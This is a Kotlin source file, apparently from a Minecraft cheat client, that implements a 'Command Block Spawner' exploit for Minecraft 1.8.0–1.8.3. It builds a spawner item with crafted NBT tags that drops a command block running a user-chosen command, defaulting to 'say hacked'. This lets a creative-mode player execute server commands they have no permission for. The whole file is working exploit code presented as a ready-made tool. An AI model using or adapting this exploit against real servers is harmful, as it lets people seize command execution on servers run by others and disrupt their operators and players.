package net.tarasandedevelopment.tarasande.screen.menu.creative

import com.viaversion.viaversion.api.protocol.version.ProtocolVersion
import de.florianmichael.viaprotocolhack.util.VersionList
import net.minecraft.item.ItemStack
import net.minecraft.item.Items
import net.minecraft.nbt.NbtCompound
import net.minecraft.nbt.NbtInt
import net.minecraft.nbt.NbtString
import net.tarasandedevelopment.tarasande.base.screen.menu.creative.ExploitCreativeItemSpawner
import net.tarasandedevelopment.tarasande.value.ValueText

val spawnerExploits = mutableListOf(
    CommandBlockSpawner()
)

class CommandBlockSpawner : ExploitCreativeItemSpawner("Command Block Spawner", ItemStack(Items.SPAWNER)) {

    private val command = ValueText(this, "Command", "say hacked")

    override fun supportedVersion(): List<ProtocolVersion> {
        return listOf(
            VersionList.R1_8 // 1.8.0 - 1.8.3
        )
    }

    override fun getSpawner(): ItemStack {
        val stack = ItemStack(Items.SPAWNER)
        val base = NbtCompound()

        val blockEntityTag = NbtCompound()
        blockEntityTag.put("EntityId", NbtString.of("FallingSand"))
        blockEntityTag.put("SpawnCount", NbtInt.of(1))
        blockEntityTag.put("SpawnRange", NbtInt.of(5))

        blockEntityTag.put("RequiredPlayerRange", NbtInt.of(100))

        blockEntityTag.put("MinSpawnDelay", NbtInt.of(20))
        blockEntityTag.put("MaxSpawnDelay", NbtInt.of(20))

        blockEntityTag.put("MaxNearbyEntities", NbtInt.of(1))

        val spawnData = NbtCompound()
        spawnData.put("Tile", NbtString.of("minecraft:command_block"))
        spawnData.put("Block", NbtString.of("minecraft:command_block"))
        spawnData.put("Time", NbtInt.of(1))

        val tileEntityData = NbtCompound()
        tileEntityData.put("Command", NbtString.of(this.command.value))

        spawnData.put("TileEntityData", tileEntityData)
        blockEntityTag.put("SpawnData", spawnData)
        base.put("BlockEntityTag", blockEntityTag)

        stack.nbt = base
        return stack
    }
}